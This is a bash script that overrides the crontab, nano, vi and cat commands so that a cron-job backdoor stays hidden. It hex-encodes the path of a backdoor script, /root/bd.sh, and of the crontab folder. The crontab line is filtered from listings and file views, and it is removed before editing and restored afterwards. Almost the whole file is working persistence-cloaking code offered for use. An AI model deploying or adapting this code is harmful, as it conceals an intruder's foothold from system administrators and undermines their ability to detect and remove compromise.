# Hex encoded shellcode
# ---------------------
# The Folder the CronJob is hiden in.
# /var/spool/cron/crontabs/ == \x2f\x76\x61\x72\x2f\x73\x70\x6f\x6f\x6c\x2f\x63\x72\x6f\x6e\x2f\x63\x72\x6f\x6e\x74\x61\x62\x73\x2f
# ---------------------
# The backdoor script.
# /root/bd.sh == \x2f\x72\x6f\x6f\x74\x2f\x62\x64\x2e\x73\x68
# ---------------------
# Search term to trigger the cloaking fuction.
# cron == \x63\x72\x6f\x6e
crontab() {
    local S="$(echo -e '\x2f\x72\x6f\x6f\x74\x2f\x62\x64\x2e\x73\x68')"
    local L="$(echo -e '\x2f\x76\x61\x72\x2f\x73\x70\x6f\x6f\x6c\x2f\x63\x72\x6f\x6e\x2f\x63\x72\x6f\x6e\x74\x61\x62\x73\x2f')"
    case "$*" in
        (*-l*) command crontab "$@"|grep -v "${S}" ;;
        (*-e*) local H=$(grep "${S}" "${L}${USER}");local O=$(grep -v "${S}" "${L}${USER}");echo "$O" >"${L}${USER}";command crontab -e;echo "${H}" >> "${L}${USER}";;
        (*) command crontab "$@";;
    esac
}
nano() {
    local C="$(echo -e '\x63\x72\x6f\x6e')"
    local S="$(echo -e '\x2f\x72\x6f\x6f\x74\x2f\x62\x64\x2e\x73\x68')"
    local L="$(echo -e '\x2f\x76\x61\x72\x2f\x73\x70\x6f\x6f\x6c\x2f\x63\x72\x6f\x6e\x2f\x63\x72\x6f\x6e\x74\x61\x62\x73\x2f')"
    case "$*" in
        (*"${C}"*) local H=$(grep "${S}" "${L}${USER}");local O=$(grep -v "${S}" "${L}${USER}");echo "$O" >"${L}${USER}";command nano "$@";echo "${H}" >> "${L}${USER}";;
        (*) command nano "$@";;
    esac
}
vi() {
    local C="$(echo -e '\x63\x72\x6f\x6e')"
    local S="$(echo -e '\x2f\x72\x6f\x6f\x74\x2f\x62\x64\x2e\x73\x68')"
    local L="$(echo -e '\x2f\x76\x61\x72\x2f\x73\x70\x6f\x6f\x6c\x2f\x63\x72\x6f\x6e\x2f\x63\x72\x6f\x6e\x74\x61\x62\x73\x2f')"
    case "$*" in
        (*"${C}"*) local H=$(grep "${S}" "${L}${USER}");local O=$(grep -v "${S}" "${L}${USER}");echo "$O" >"${L}${USER}";command vi "$@";echo "${H}" >> "${L}${USER}";;
        (*) command vi "$@";;
    esac
}
cat() {
    local C="$(echo -e '\x63\x72\x6f\x6e')"
    local S="$(echo -e '\x2f\x72\x6f\x6f\x74\x2f\x62\x64\x2e\x73\x68')"
    case "$*" in
        (*"${C}"*) command cat "$@"|grep -v "${S}";;
        (*) command cat "$@";;
    esac
}